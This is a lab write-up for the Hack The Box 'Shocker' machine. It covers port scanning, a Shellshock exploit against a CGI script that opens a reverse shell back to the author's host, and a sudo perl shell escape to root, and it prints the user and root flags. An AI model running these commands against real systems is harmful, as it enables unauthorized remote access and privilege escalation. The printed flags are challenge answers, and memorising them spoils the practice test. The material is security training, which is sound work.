# Shocker
> Write-up author: jon-brandy

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/6a3d07d8-d7ff-47dc-bc67-8d520eff6f0d)


## STEPS:

> PORT SCANNING

```
┌──(brandy㉿bread-yolk)-[~]
└─$ nmap -p- -sVC 10.10.10.56 --min-rate 1000
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-29 06:17 PDT
Nmap scan report for shocker.htb (10.10.10.56)
Host is up (0.034s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4f8ade8f80477decf150d630a187e49 (RSA)
|   256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA)
|_  256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.02 seconds
```

1. Based from the nmap result, we know the machine runs a web application and ssh service.
2. Since there's no interesting info currently, i ran dirbuster and found a directory named `cgi-bin`.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/98b50867-ce6d-4244-8830-f178eda7757d)


3. Which is interesing, it's forbidden. Judging from the challenge title and the directory we found.
4. This challenge could be related to `shellshock exploit` --> `Apache mod CGI`.
5. This should be the one --> `https://www.exploit-db.com/exploits/34900` (since the web service is apache).

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/64478c1c-5325-41e0-8907-53dcba9bcd91)


6. Let's use the python script from the documentation.

```bash
python2 reverse_shell.py payload=reverse rhost=10.10.10.56 lhost=10.10.14.26 lport=443 pages=/cgi-bin/user.sh
```

```
┌──(brandy㉿bread-yolk)-[~/Downloads/machine/machine_shocker]
└─$ python2 reverse_shell.py payload=reverse rhost=10.10.10.56 lhost=10.10.14.26 lport=443 pages=/cgi-bin/user.sh
[!] Started reverse shell handler
[-] Trying exploit on : /cgi-bin/user.sh
[!] Successfully exploited
[!] Incoming connection from 10.10.10.56
10.10.10.56> whoami
shelly

10.10.10.56> 
```


> GETTING USER FLAG

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/7faa2e3b-6dc0-4795-82c2-2ab2bc6e05dd)


## USER FLAG

```
c40e31276c798e9a8443c4c51866e733
```

7. After checking sudo permission for shelly, it seems we can run perl without password.
8. This should gave us root easily by run --> `perl -e 'exec "/bin/sh";'`. Documentation --> https://gtfobins.github.io/gtfobins/perl/

```
10.10.10.56> sudo /usr/bin/perl -e 'exec "/bin/sh";'
10.10.10.56> whoami
root

10.10.10.56> 
```

> GETTING ROOT FLAG

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/7f6e5e4a-319f-44d8-a166-0eed6bc3fd6f)


## ROOT FLAG

```
c5622bf600ecac10ac18b6095a0a614c
```

